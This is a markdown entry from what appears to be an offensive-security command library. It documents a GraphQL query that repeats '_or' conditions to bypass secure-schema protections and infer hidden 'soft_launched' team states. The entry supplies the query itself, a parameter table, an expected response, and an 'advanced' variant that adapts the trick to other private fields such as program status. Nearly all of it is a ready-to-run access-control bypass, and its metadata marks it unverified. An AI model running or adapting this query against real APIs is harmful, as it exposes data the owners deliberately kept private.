---
id: cmd-graphql-or-001
data: >-
  query { teams(where:{_or:[{state:{_eq:soft_launched}},
  {state:{_eq:soft_launched}}]}) { edges { node { id state } } } }
tags:
  - graphql
  - exploit
  - bypass
type: command
output: >-
  JSON response with teams array containing edges.node objects; state may be
  null for hidden teams
executor: graphql
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.088Z'
verified: false
validated: true
submitted: true
---
# graphql-duplicate-or-query

## Command

```graphql
query { teams(where:{_or:[{state:{_eq:soft_launched}}, {state:{_eq:soft_launched}}]}) { edges { node { id state } } } }
```

## Description

This GraphQL query exploits the '_or' operator with duplicate conditions to bypass secure schema protections, retrieving team data where the second condition queries the raw schema, exposing private 'soft_launched' states as null for inference.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| where._or[0].state._eq | First condition: 'soft_launched' (secure schema applied) | Yes |
| where._or[1].state._eq | Second duplicate condition: 'soft_launched' (raw schema queried) | Yes |
| edges.node.id | Retrieve team ID | Yes |
| edges.node.state | Retrieve state (may be null) | Yes |

## Examples

### Basic Usage

```graphql
query { teams(where:{_or:[{state:{_eq:soft_launched}}, {state:{_eq:soft_launched}}]}) { edges { node { id state } } } }
```

### Advanced Usage

Adapt for other fields, e.g., replace 'teams' with another collection and 'state' with a filterable private field.

```graphql
query { programs(where:{_or:[{status:{_eq:private}}, {status:{_eq:private}}]}) { edges { node { id status } } } }
```

## Expected Output

Successful execution returns a JSON object like {"data":{"teams":{"edges":[{"node":{"id":"team-123","state":null}}]}}}, where null state infers 'soft_launched' due to the bypass.

## Related

- [[commands/graphql-single-state-query]]
- [[procedures/Exploit-GraphQL-Secure-Schema-Bypass-Using-Duplicate-Conditions]]
